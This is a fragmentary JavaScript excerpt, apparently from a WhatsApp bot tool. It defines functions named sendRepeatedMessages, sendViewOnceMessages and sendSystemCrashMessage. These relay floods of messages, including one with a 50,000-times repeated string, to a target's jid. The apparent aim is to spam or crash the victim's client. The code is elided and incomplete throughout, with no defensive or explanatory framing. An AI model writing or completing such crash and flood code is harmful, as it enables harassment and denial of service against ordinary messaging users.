...
await ExloneInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
...
async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   ExloneInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
...
async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    ...
    ExloneInc.relayMessage(jid, messageContent.message, {
...
async function sendSystemCrashMessage(jid) {
  ...
  await ExloneInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
